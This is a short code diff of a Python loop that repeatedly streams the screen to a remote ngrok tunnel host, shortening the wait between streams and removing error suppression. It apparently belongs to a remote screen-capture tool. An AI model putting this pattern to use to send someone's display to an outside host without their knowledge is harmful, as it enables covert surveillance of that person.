@@ -6,10 +6,8 @@ import time
 
 ####################################################################
 while(True):
-    try:
-        Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
-        Client.start_stream()
-        time.sleep(300)
-        Client.stop_stream()
-    except:pass
+    Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
+    Client.start_stream()
+    time.sleep(3)
+    Client.stop_stream()
 ####################################################################
